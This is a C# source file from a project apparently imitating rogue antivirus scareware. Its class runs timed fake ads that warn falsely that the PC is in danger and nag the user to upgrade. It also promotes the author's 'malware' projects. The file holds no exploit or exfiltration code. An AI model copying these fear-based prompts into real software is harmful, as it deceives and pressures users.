using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Media.Imaging;
using System.Windows.Threading;
using RogueAntivirusPatched.Global;
using RogueAntivirusPatched.Model;
using RogueAntivirusPatched.View.Pages;
using System.Media;
using System.Runtime.CompilerServices;
using static RogueAntivirusPatched.Global.UISettings;
using System.Drawing;
using System.Diagnostics;
using System.IO;

namespace RogueAntivirusPatched.Advertisement
{
    internal class RandomAd
    {
        private DispatcherTimer timerWindowAd, timerNotifyAd;
        private KeySender keySender;
        private NotifyAd notifyAd;
        private Sounds sounds;
        private static readonly Random rand = new Random();

        private TestPublisher publisher;
        private Windows.Advertisement advertisement;

        private event EventHandler ProHandler, NegProHandler;

        public RandomAd()
        {
            keySender = new KeySender();
            notifyAd = new NotifyAd();
            sounds = new Sounds();

            publisher = new TestPublisher();
            publisher.adEventHandler += RandomAd_adHandler;
        }

        public class AdEventArgs : EventArgs
        {
            public enum AdvertisementType
            {
                UpgradeToPro = 0,
                Rover = 1,
                Clutt = 2,
                FakeCaptcha = 3,
                Gayfemboy = 4,
                BonziBuddy = 5
            }
            public AdvertisementType AdType { get; }

            public AdEventArgs(AdvertisementType adType)
            {
                AdType = adType;
            }
        }

        public class TestPublisher
        {

            public event EventHandler<AdEventArgs> adEventHandler;

            public void RaiseMessage(AdEventArgs.AdvertisementType adType)
            {
                adEventHandler?.Invoke(this, new AdEventArgs(adType));
            }

        }

        public class NegavPublisher
        {

            public event EventHandler<AdEventArgs> adEventHandler;

            public void RaiseMessage(AdEventArgs.AdvertisementType adType)
            {
                adEventHandler?.Invoke(this, new AdEventArgs(adType));
            }

        }

        public void SetUpAds()
        {
            timerWindowAd = new DispatcherTimer();
            timerWindowAd.Interval = TimeSpan.FromSeconds(rand.Next(80, 100));
            timerWindowAd.IsEnabled = true;
            timerWindowAd.Tick += TimerWindowAd_Tick;

            timerNotifyAd = new DispatcherTimer();
            timerNotifyAd.Interval = TimeSpan.FromSeconds(rand.Next(60, 120));
            timerNotifyAd.IsEnabled = true;
            timerNotifyAd.Tick += TimerNotifyAd_Tick;
        }

        private void TimerNotifyAd_Tick(object sender, EventArgs e)
        {
            if (Variables.PayloadsRunning || Variables.KeystrokeTriggerRunning)
            {
                timerWindowAd.Stop();
                return;
            }

            CheckLicense();

            int index = rand.Next(5);

            string text, header, btnYes, btnNo, btnYesArgument = "";
            Uri imageSource;

            switch (index)
            {
                case 0:
                    text = "It looks like you are running the antivirus in a Trial Mode. " + Environment.NewLine + "We can provide you better features and make your PC safer if you upgrade to the Pro Version. " + Environment.NewLine + "Click on this notification and we will redirect you to the Registration Page.";
                    header = "Upgrade to the Pro Version";
                    btnYes = "Upgrade to Pro";
                    btnNo = "Not now";
                    btnYesArgument = "UpgradeBtn";

                    notifyAd.SetNotification(text, header, btnYes, btnNo, btnYesArgument);

                    break;
                case 1:
                    text = "Your PC might be in danger! " + Environment.NewLine + "It is critical to scan your PC at least once a week. Keep in mind that some malware can steal your precious data. To prevent such a disaster, scan your PC immediately!";
                    header = "Scan your PC";
                    btnYes = "Okay";
                    btnNo = "Maybe Later";
                    btnYesArgument = "AntivirusBtn";
                    imageSource = Images.threat;

                    notifyAd.SetNotification(text, header, btnYes, btnNo, btnYesArgument, imageSource);

                    break;
                case 2:
                    text = "Did you know that most applications create registry data, which helps them to store some of their settings? However, some registry data can be left unused, and the application that created it might not get erased them. " 
                        + Environment.NewLine + "Search for this useless data and get better performance!";
                    header = "Keep your Registry Clean";
                    btnYes = "Okay";
                    btnNo = "Maybe Later";
                    btnYesArgument = "RegistryBtn";
                    imageSource = Images.registry;

                    notifyAd.SetNotification(text, header, btnYes, btnNo, btnYesArgument, imageSource);

                    break;
                case 3:
                    text = @"When applications are running, sometimes they produce ""log files,"" which are usually filled with a bunch of error lines. " 
                        + Environment.NewLine + "Deleting these files can release up to 10 GB of space! " 
                        + Environment.NewLine + "Do you want to check how much space you can get?";
                    header = "Increase the Disk Space";
                    btnYes = "Okay";
                    btnNo = "Maybe Later";
                    btnYesArgument = "CleanerBtn";
                    imageSource = Images.sweep;

                    notifyAd.SetNotification(text, header, btnYes, btnNo, btnYesArgument, imageSource);

                    break;
                case 4:
                    text = @"In case of complex problems, we are online 24/7 to solve them." 
                        + Environment.NewLine + "Don't hesitate to contact us via our email!";
                    header = "Do you need Special Help?";
                    btnYes = "Contact Us!";
                    btnNo = "Maybe Later";
                    btnYesArgument = "ContactBtn";
                    imageSource = Images.support;

                    notifyAd.SetNotification(text, header, btnYes, btnNo, btnYesArgument, imageSource);

                    break;
            }
        }

        private static List<int> displayedAds = new List<int>();

        private void TimerWindowAd_Tick(object sender, EventArgs e)
        {
            if (Variables.PayloadsRunning || Variables.KeystrokeTriggerRunning)
            {
                timerWindowAd.Stop();
                return;
            }

            CheckLicense();

            int indexLenght = Enum.GetValues(typeof(AdEventArgs.AdvertisementType)).Length;
            int index = rand.Next(indexLenght);
            bool escape = false;

            if (displayedAds.Count == indexLenght)
                displayedAds.Clear();

            if (displayedAds.Count > 0)
            {
                do
                {
                    index = rand.Next(indexLenght);
                    foreach (var ad in displayedAds)
                    {
                        if (ad == index)
                        {
                            escape = false;
                            break;
                        }
                        escape = true;
                    }
                } while (!escape);
            }

            displayedAds.Add(index);

            string text, bodyText, yesBtn, noBtn, title;
            double width, height;
            Bitmap bitmapImage = null;
            Bitmap[] multipleImages = null;
            UnmanagedMemoryStream sound = Properties.Resources.tweet;

            advertisement = new Windows.Advertisement();

            bool wait = true;

            switch (index)
            {
                case 0:
                    text = "Upgrade to Pro Version";
                    bodyText = "It looks like you are still in the trial mode! " + Environment.NewLine + "Keep in mind that the Trial Mode is very limited, and it will expire after 7 days. When the Trial Mode ends, you will lose access to all of the features, and caught threats will be released from the quarantine." + Environment.NewLine + Environment.NewLine +
                        "Don't hesitate to Upgrade to the Pro so you can keep your PC safe!";
                    yesBtn = "Buy Now";
                    noBtn = "Maybe later";
                    title = "Special Offer";
                    width = 700.0;
                    height = 500.0;
                    bitmapImage = Properties.Resources.emoji_cool_blue;

                    advertisement.btn_1.Click += (s2, e2) => publisher.RaiseMessage(AdEventArgs.AdvertisementType.UpgradeToPro);
                    advertisement.btn_2.Click += (s2, e2) => 
                    {
                        TTS.SpeakInterrupted(Variables.someResponses[rand.Next(Variables.someResponses.Length)], 100, 3);
                    };

                    advertisement.ShowAdvertisement(wait, text, title, bodyText, yesBtn, noBtn, null, null, width, height, bitmapImage, sound);

                    break;
                case 1:
                    text = "Get your Desktop Pet";
                    bodyText = "Does your desktop look boring? If so, you should get the Rover Desktop Assistant!" +
                        Environment.NewLine + Environment.NewLine + "Why should you download Rover?" +
                        Environment.NewLine + 
                        "● It's for FREE" + Environment.NewLine +
                        "● Provides GDI effects" + Environment.NewLine +
                        "● He can talk to you thanks to its built in Text To Speech (TTS)" + Environment.NewLine +
                        "● Rover knows a lot of fun facts and can even tell jokes :D" + Environment.NewLine +
                        "● He will definitely not corrupt your system ;)" + Environment.NewLine +
                        "● Very friendly assistant";
                    yesBtn = "Get Now";
                    noBtn = "Maybe later";
                    title = "Special Offer";
                    width = 700.0;
                    height = 600.0;
                    bitmapImage = Properties.Resources.rover;


                    advertisement.btn_1.Click += (s2, e2) => publisher.RaiseMessage(AdEventArgs.AdvertisementType.Rover);

                    advertisement.ShowAdvertisement(wait, text, title, bodyText, yesBtn, noBtn, null, null, width, height, bitmapImage, sound);

                    break;
                case 2:
                    text = "Remember Clutt Virus?";
                    bodyText = "Clutt (full name = Clutter Destructive) is a dangerous malware created by me, Cyber Soldier." + 
                        Environment.NewLine + 
                        "This malware went through a lot of changes and improvements, but suddenly, the development was paused due to " +
                        "a lack of new ideas." + Environment.NewLine +
                        "Recently I was thinking about some new features, so it might return soon.";
                    yesBtn = "Ok";
                    noBtn = "Cancel";
                    title = "News";
                    width = 900.0;
                    height = 600.0;

                    multipleImages = new Bitmap[]
                    {
                        Properties.Resources.clutt_destructive,
                        Properties.Resources.clutt,
                        Properties.Resources.clutt3,
                        Properties.Resources.clutt4,
                        Properties.Resources.clutt4_5,
                        Properties.Resources.unknown_file,
                        Properties.Resources.clutt6,
                        Properties.Resources.unknown_file
                    };

                    advertisement.btn_1.Click += (s2, e2) => publisher.RaiseMessage(AdEventArgs.AdvertisementType.Clutt);

                    advertisement.ShowAdvertisement(wait, text, title, bodyText, yesBtn, noBtn, null, null, width, height, null, sound, 100, 100, multipleImages);

                    break;

                case 3:
                    text = "Watch out for Fake Captcha";
                    bodyText = "Some sketchy websites contain fake CAPTCHAs, which steal data " +
                        "or redirects people to other malicious websites." + Environment.NewLine +
                        "If you stumble upon a weird-looking CAPTCHA like this one, get out " +
                        "from the website immediately!" + Environment.NewLine +
                        "Your data is precious; you should keep what belongs to you!";
                    yesBtn = "Ok";
                    noBtn = "Cancel";
                    title = "Alert";
                    width = 700.0;
                    height = 600.0;
                    bitmapImage = Properties.Resources.fakeCaptcha;

                    advertisement.btn_1.Click += (s2, e2) => publisher.RaiseMessage(AdEventArgs.AdvertisementType.Clutt);

                    advertisement.ShowAdvertisement(wait, text, title, bodyText, yesBtn, noBtn, null, null, width, height, bitmapImage, sound, 400, 300);

                    break;

                case 4:
                    text = "Gayfemboy Malware";
                    bodyText = "A stealthy malware strain, dubbed \"Gayfemboy,\" has been observed " +
                        "exploiting a range of vulnerabilities to infiltrate systems. Most recent attacks " +
                        "target vulnerabilities in products from vendors such as DrayTek, TP-Link, " +
                        "Raisecom, and Cisco. The malware's reach is global, affecting countries including " +
                        "Brazil, France, Germany, Israel, Mexico, the United States, Switzerland, and " +
                        "Vietnam, and is impacting sectors such as Construction, Manufacturing, Technology, " +
                        "and Media/Communications. Gayfemboy employs sophisticated evasion techniques, " +
                        "including custom file naming to avoid predictable patterns, obfuscation with " +
                        "modified UPX headers, and self-protection mechanisms. Its core modules include " +
                        "monitoring for anti-analysis and persistence features, a watchdog to ensure single " +
                        "instance operation, DDoS and backdoor functionalities, and a killer module to " +
                        "eliminate rival malware or enforces self-termination.";
                    yesBtn = "Ok";
                    noBtn = "Cancel";
                    title = "News";
                    width = 800.0;
                    height = 800.0;
                    bitmapImage = Properties.Resources.lgbt_flag;

                    advertisement.btn_1.Click += (s2, e2) => publisher.RaiseMessage(AdEventArgs.AdvertisementType.Gayfemboy);

                    advertisement.ShowAdvertisement(wait, text, title, bodyText, yesBtn, noBtn, null, null, width, height, bitmapImage, sound, 300, 200);

                    break;

                case 5:
                    text = "BonziBuddy";
                    bodyText = "BonziBuddy was a Windows program released in the late 1990s " +
                        "featuring a talking purple gorilla that acted as a “desktop assistant.” " +
                        "It could tell jokes, sing, and help with web browsing, but it quickly " +
                        "became notorious for installing adware, tracking user activity, and " +
                        "showing pop-up ads. Once promoted as a friendly helper like Microsoft’s" +
                        "Clippy, it is now remembered as one of the most infamous examples of" +
                        "spyware-disguised-as-software.";
                    yesBtn = "Ok";
                    noBtn = "Cancel";
                    title = "Did you know?";
                    width = 800.0;
                    height = 700.0;
                    multipleImages = new Bitmap[]
                    {
                        Properties.Resources.bonzi_stare,
                        Properties.Resources.bonzi_is_welcoming,
                        Properties.Resources.bonzi_skateboard
                    };

                    advertisement.btn_1.Click += (s2, e2) => publisher.RaiseMessage(AdEventArgs.AdvertisementType.BonziBuddy);

                    advertisement.ShowAdvertisement(wait, text, title, bodyText, yesBtn, noBtn, null, null, width, height, null, sound, 200, 200, multipleImages);

                    break;

            }
        }

        private void RandomAd_adHandler(object sender, AdEventArgs e)
        {
            if (Variables.IsPageWorking)
            {
                Messages.ProcessIsRunning();
                return;
            }

            int index = (int)e.AdType;

            switch (index)
            {
                case 0:
                    ShowWindow();
                    Application.Current.Dispatcher.Invoke(() =>
                    {
                        var mainWindow = (MainWindow)Application.Current.MainWindow;
                        mainWindow.Dispatcher.Invoke(() =>
                        {
                            mainWindow.VmMainWindow.ContentPage = new RegisterPage();
                        });
                    });

                    break;
                case 1:
                    ShowWindow();
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = "https://github.com/MalwareStudio/Rover-The-Desktop-Assistant-Beta-1.2",
                        UseShellExecute = true
                    });

                    break;
            }
        }

        public void OnlyForPro()
        {
            CheckLicense();

            bool wait = true;
            string text = "Why doesn't it work?";
            string bodyText = "The feature that you are trying to launch is only available in the Pro Version. If you want to get access to all of the features without any restrictions, Upgrade to the Pro Version Now!";
            string yesBtn = "Upgrade Now";
            string noBtn = "Maybe Later";
            string title = "This Feature Is Not Available";
            double width = 700.0;
            double height = 400.0;
            var bitmapImage = Properties.Resources.blue_sad;
            var sound = Properties.Resources.cry;

            ProHandler += OnlyForPro_eventHandlerYes;
            NegProHandler += OnlyForPro_eventHandlerNo;

            advertisement = new Windows.Advertisement();

            advertisement.ShowAdvertisement(wait, text, title, bodyText, yesBtn, noBtn, ProHandler, NegProHandler, width, height, bitmapImage, sound);
        }

        private void OnlyForPro_eventHandlerYes(object sender, EventArgs e)
        {
            Application.Current.Dispatcher.Invoke(() =>
            {
                var mainWindow = (MainWindow)Application.Current.MainWindow;
                mainWindow.Dispatcher.Invoke(() =>
                {
                    mainWindow.VmMainWindow.ContentPage = new RegisterPage();
                });
            });

            ProHandler -= OnlyForPro_eventHandlerYes;
        }

        private void OnlyForPro_eventHandlerNo(object sender, EventArgs e)
        {
            TTS.SpeakInterrupted(Variables.someResponses[rand.Next(Variables.someResponses.Length)],
                    100, rand.Next(-3, 5));

            NegProHandler -= OnlyForPro_eventHandlerNo;
        }

        private void CheckLicense()
        {
            if (keySender.HasLicense)
            {
                timerWindowAd.IsEnabled = false;
                timerWindowAd.Stop();
                timerNotifyAd.IsEnabled = false;
                timerNotifyAd.Stop();
            }
        }
    }
}
